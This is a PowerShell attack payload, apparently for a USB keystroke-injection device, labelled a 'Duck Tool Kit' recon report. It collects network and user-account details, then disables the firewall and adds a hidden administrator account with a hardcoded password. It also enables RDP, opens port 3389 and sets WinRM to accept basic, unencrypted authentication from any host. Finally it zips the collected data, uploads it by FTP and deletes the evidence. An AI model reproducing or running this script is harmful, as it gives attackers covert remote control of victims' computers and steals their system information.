$folderDateTime = (get-date).ToString('d-M-y HHmmss')
$userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
$fileSaveDir = New-Item  ($userDir) -ItemType Directory 
$date = get-date 
$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
$Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
$Report =  $Report + '<div id=center><h3>Network Information</h3>'
$Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)
$Report = $Report + '</table></div>'
$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired  
$UserType = $UserInfo.AccountType 
$UserSid = $UserInfo.SID
$UserPass = $UserInfo.PasswordRequired 
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 
$Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
$Report = $Report + '</div>' 
netsh advfirewall set allprofiles state off  
Net User Schro Dinger  /ADD 
Net LocalGroup Administrateurs Schro  /ADD
Net LocalGroup Administrators Schro /ADD
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList' /v Schro /t REG_DWORD /d 0 /f
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
netsh advfirewall firewall add rule name = "allow RemoteDesktop" dir = in protocol = TCP localport = 3389 action = allow
Enable-PSRemoting  -Force -SkipNetworkProfileCheck
$ProfileName = Get-NetConnectionProfile
Set-NetConnectionProfile -Name $ProfileName.Name -NetworkCategory Private
winrm quickconfig
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
winrm set winrm/config/service/auth '@{CbtHardeningLevel="relaxed"}'
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -force -Confirm:$false
$Report >> $fileSaveDir'/ComputerInfo.html' 
function copy-ToZip($fileSaveDir){ 
$srcdir = $fileSaveDir 
$zipFile = 'C:\Windows\Report.zip'
if(-not (test-path($zipFile))) { 
set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
(dir $zipFile).IsReadOnly = $false} 
$shellApplication = new-object -com shell.application 
$zipPackage = $shellApplication.NameSpace($zipFile) 
$files = Get-ChildItem -Path $srcdir 
foreach($file in $files) { 
$zipPackage.CopyHere($file.FullName) 
while($zipPackage.Items().Item($file.name) -eq $null){ 
Start-sleep -seconds 1 }}} 
copy-ToZip($fileSaveDir) 
$final = 'C:\Windows\Report.zip'
$ftpAddr = ""
$url = New-Object System.Uri($ftpAddr)  
$browser.UploadFile($url, $final)  
remove-item $fileSaveDir -recurse 
remove-item 'C:\Windows\Report.zip'